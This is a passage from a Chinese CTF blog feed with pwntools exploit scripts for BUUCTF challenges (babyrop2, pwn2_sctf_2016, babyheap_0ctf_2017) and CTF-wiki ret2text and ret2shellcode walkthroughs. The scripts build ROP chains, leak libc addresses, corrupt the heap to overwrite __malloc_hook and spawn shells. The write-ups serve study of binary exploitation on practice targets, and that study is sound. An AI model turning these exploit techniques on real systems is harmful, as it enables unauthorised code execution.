class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p=process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25002</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">format_addr=<span class="number">0x400770</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000040072c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400730 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400732 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004005a0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400733 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400731 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040072d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004004d1 : ret</span></span><br><span class="line"><span class="string">0x0000000000400532 : ret 0x200a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(format_addr)+p64(<span class="number">0x400731</span>)+p64(read_got)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;read&quot;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(binsh_addr)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn2_sctf_2016"><a class="markdownIt-Anchor" href="#pwn2_sctf_2016">#</a> pwn2_sctf_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29130</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">format_str = <span class="number">0x080486F8</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是程序正常输出的</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是printf的那个格式化字符串</span></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(sys_addr) + p32(main_addr) + p32(str_bin))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#复制自https://blog.csdn.net/qinying001/article/details/104374305</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./test1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *(<span class="number">0xC8</span>+<span class="number">4</span>) + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;read&quot;, read_addr)</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * (<span class="number">0xC8</span>+<span class="number">4</span>) + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>堆溢出</p><span id="more"></span><h2 id="malloc_chunk的结构"><a class="markdownIt-Anchor" href="#malloc_chunk的结构">#</a> malloc_chunk 的结构</h2><p>参考文章：<a href="https://blog.csdn.net/weixin_43847969/article/details/104897249">https://blog.csdn.net/weixin_43847969/article/details/104897249</a></p><p><img src="https://img-blog.csdnimg.cn/20200316131506363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt=""></p><p>pre_size:</p><p>这个参数分两种情况，一种情况记录大小，一种情况记录数据<br>当前一个 chunk 的状态是空闲时记录大小（也就是被 free 的时候），<br>当前一个 chunk 的状态不是空闲的时候，记录它的数据。<br>然后是</p><p>size：</p><p>就是这个 chunk 的大小，size 的最后 3 个比特位对大小没有影响，但是要表示了一些东西<br>分别是 non_main_arena : 记录当前 chunk 是否属于主线程<br> is_mapped：当前 chunk 是否由 mmap 分配<br> prev_inuse：记录前一个 chunk 是否被分配（这个最重要，因为我们当这个参数为 0 时，我们能够通过它获得上一个 chunk 的大小和地址）</p><p>fd,bk:</p><p>表示用户数据，或者表示地址<br> chunk 非空闲时，fd 和 bk 存在的地方表示的是用户的数据，<br>chunk 空闲时，fd 存储下一个空闲的 chunk，bk 指向上一个空闲的 chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被 free 的顺序，而不是地址上的相邻。</p><h2 id="chunk的结构"><a class="markdownIt-Anchor" href="#chunk的结构">#</a> chunk 的结构</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150944434.png" alt="在这里插入图片描述"></p><p>第一个是 size of previous（前一个 chunk 的大小，如果前一个 chunk 空闲的话）<br>第二个 size of chunk 当前 chunk 的大小，然后再末尾有 3 个比特位 amp 分别代表上面介绍过的 3 个参数<br>第三个就是存储数据的部分<br>然后就到了下一个 chunk (next_chunk)，我们把这个 next_chunk 称为 chunk2, 上面的 chunk 称为 chunk1，可以看到如果 chunk1 正在使用的话，那么 chunk 的头部位置，也就是 prev_size，会被 chunk1 使用<br>然后 chunk2 的第二行的后三个比特位也分别是 A01，A 代表着是否属于主线程（这里我们不知道所以用 A 代替），0 代表着当前 chunk 不是由 mmap 分配，1 代表着前一个 chunk 已经被分配。</p><p>chunk 被 free 后结构变化：</p><p><img src="https://img-blog.csdnimg.cn/20200316134429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第一行，没变化，因为它是 chunk1<br> 第二行开始，M 的位置变成了 0，代表着 chunk 不是由 mmap 分配<br>第三行开始，原本存储数据的部分变成了 forward pointer to next chunk in list<br> 也就是 fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被 free 了，那么就存储的是下一个空闲的 chunk，下面的 back pointer to previous chunk in list（bk）同理.<br> 然后就到了 unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种 bin 中去。<br>然后就到了 chunk2, 第一行记录当前 chunk 的大小，（并且不会被前一个 chunk 占用）<br>第二行记录前一个 chunk 的大小，并且末尾三位变成了 A00,（这时候如果这个是堆中第一个被分配的 chunk 的话我们能通过 prev_size 字段获取上一个 chunk 的大小以及地址。）<br><img src="https://img-blog.csdnimg.cn/20200316135249139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>chunk 的空间复用：</p><p><img src="https://img-blog.csdnimg.cn/20200316133135882.png" alt="在这里插入图片描述"></p><h2 id="bin及分类"><a class="markdownIt-Anchor" href="#bin及分类">#</a> bin 及分类</h2><p><img src="https://img-blog.csdnimg.cn/20200316135544629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="fast-bins"><a class="markdownIt-Anchor" href="#fast-bins">#</a> fast bins</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150958166.png" alt="在这里插入图片描述"></p><h3 id="small-bins"><a class="markdownIt-Anchor" href="#small-bins">#</a> small bins</h3><h3 id="large-bins"><a class="markdownIt-Anchor" href="#large-bins">#</a> large bins</h3><h3 id="unsorted-bins"><a class="markdownIt-Anchor" href="#unsorted-bins">#</a> unsorted bins</h3><p>未被分类，刚被 free 未真的进入 bin</p><p>Top Chunk</p><p><img src="https://img-blog.csdnimg.cn/20200316140527864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="babyheap_0ctf_2017"><a class="markdownIt-Anchor" href="#babyheap_0ctf_2017">#</a> babyheap_0ctf_2017</h1><p>考点： fastbin attack</p><h2 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路">#</a> 利用思路</h2><p>两次 double free 与 fastbin attack 。<br>第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。<br>第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。</p><h2 id="利用过程"><a class="markdownIt-Anchor" href="#利用过程">#</a> 利用过程</h2><p>1、通过 unsortedbin attack 来泄露 libc 地址</p><p>首先应该记住这样一条规律：当 small chunk 被释放时，它的 fd、bk 指向一个指针，这个指针指向 top chunk 地址，这个指针保存在 main_arena 的 0x58 偏移处，而 main_arena 是 libc 的 data 段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出 libc 的基地址了，所以<em><strong>重点是当 small chunk 释放时，能读出 fd 或者 bk 的值</strong></em></p><p>我首先通过如下重叠两个块来泄漏 libc 的地址（也是常见的攻击）。<br><img src="https://img-blog.csdnimg.cn/20201002095257731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29370</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">a</span>):</span><br><span class="line">    p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    <span class="comment">#p.readuntil(&#x27;Command:&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    p.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(b))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.write(c)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">a</span>):  </span><br><span class="line">    p.writeline(<span class="string">&#x27;3&#x27;</span>)   </span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">a</span>):</span><br><span class="line">    p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)) <span class="comment">#size1+size2</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#1    #free1</span></span><br><span class="line">alloc(<span class="number">0x18</span>)   <span class="comment">#alloc1</span></span><br><span class="line">show(<span class="number">2</span>)     <span class="comment">#fd, bk at alloc2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3c4aed</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one = libcbase + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment">#free2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">update(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook))   <span class="comment">#fd at 2-&gt;malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#4 at malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x1b</span>, p8(<span class="number">2</span>)*<span class="number">3</span>+p64(<span class="number">2</span>)*<span class="number">2</span>+p64(one))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">255</span>) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-WIKI-pwn-基本ROP 漏洞复现</title>
      <link href="/2021/11/11/ROP/"/>
      <url>/2021/11/11/ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="基本rop"><a class="markdownIt-Anchor" href="#基本rop">#</a> 基本 ROP</h1><span id="more"></span><h2 id="ret2text"><a class="markdownIt-Anchor" href="#ret2text">#</a> ret2text</h2><p>首先检查程序的保护机制。</p><p><img src="https://img-blog.csdnimg.cn/2019022710543258.png" alt="img"></p><p>关于各个保护机制的介绍 :<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p><p>看到只开启了 NX 保护，即不可在栈上执行代码。</p><p>使用 IDA 查看源码，可以看到这里有一个危险的 gets 函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111810747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>以及这里有一个 system 函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111904256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227111935558.png" alt="img"></p><p>所以如果能直接返回到 0x804863A，即可执行该函数。</p><p>在 GDB 中对 main 函数里的 gets 函数下断点。</p><p><img src="https://img-blog.csdnimg.cn/20190227112321284.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227112412951.png" alt="img"></p><p>可以看到，存储局部变量 s (eax) 位于 esp 中存储</p><p>查看 esp 和 ebp 得知</p><p><img src="https://img-blog.csdnimg.cn/201902271125369.png" alt="img"></p><p>s 的地址为 0xffffcecc</p><p>ebp 地址为 0xffffcf38</p><p><img src="https://img-blog.csdnimg.cn/20190227112810664.png" alt="img"></p><p>两者距离 108 个字节</p><p>所以 108+4=112 即为返回地址的地址。(因为没有开启 canary，ebp 上就是返回地址的值了。)</p><p><img src="https://img-blog.csdnimg.cn/20190227113810258.png" alt="img"></p><p>python 脚本，我会给出注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>) <span class="comment">#本地链接到文件</span></span><br><span class="line">target = <span class="number">0x804863a</span> <span class="comment">#执行system(&#x27;/bin/sh&#x27;)函数的地址</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> + p32(target)) <span class="comment"># 112是上面计算出来的s距离返回地址的字节距离</span></span><br><span class="line">sh.interactive() <span class="comment">#进行交互</span></span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode">#</a> ret2shellcode</h2><p>先检查程序的保护机制</p><p><img src="https://img-blog.csdnimg.cn/20190227164142987.png" alt="img"></p><p>全部关闭，并且通过 RELRO 为 Partial 部分模式，得知程序存在存在可读可写可执行段。</p><p><img src="https://img-blog.csdnimg.cn/20190227164305727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>通过 IDA 观察得知，这次同样使用不安全的 gets 输入，并且将输入完的值拷贝至 buf2，观察 buf2 是什么样的一块内存。</p><p><img src="https://img-blog.csdnimg.cn/20190227164359894.png" alt="img"></p><p>buf 是一块位于 bss 段的可读可写可执行段。所以泄露思路为:</p><p>将 shellcode 拷贝至 buf2 里，然后通过堆栈溢出将函数返回到执行 buf2 即可。</p><p>在 gets 函数处下断点</p><p><img src="https://img-blog.csdnimg.cn/20190227165108812.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227165123143.png" alt="img"></p><p>得知 s 地址为 0xffffcecc，ebp 地址为 0xffffcf38</p><p>ebp+4 即为函数返回地址。</p><p>所以 0xcf38-0xcecc+4 即为 s 与返回地址之间的字节距离。</p><p>写 python 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;ret2shellcode&#x27;</span> <span class="comment">#全局自动设置架构类型与os类型</span></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2shellcode&#x27;</span>) <span class="comment">#本地连接</span></span><br><span class="line">target=<span class="number">0x804A080</span><span class="comment">#buf2的地址</span></span><br><span class="line">shellcode=asm(shellcraft.sh())<span class="comment">#产生以一个最简单的执行system(&#x27;/bin/sh&#x27;)的shellcode 并进行汇编</span></span><br><span class="line"><span class="built_in">print</span>(p32(target))</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xcf38</span>-<span class="number">0xcecc</span>+<span class="number">4</span>,<span class="string">&#x27;A&#x27;</span>)+p32(target)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall">#</a> ret2syscall</h2><p>先检查开启了哪些防护措施</p><p><img src="https://img-blog.csdnimg.cn/20190227225033419.png" alt="img"></p><p>开启了 NX 保护，所以无法在栈上直接执行代码。</p><p>使用 IDA 查看，仍然是 gets 函数导致的栈溢出。</p><p>使用系统调用来完成漏洞利用。</p><p><img src="https://img-blog.csdnimg.cn/20190227225149853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p><img 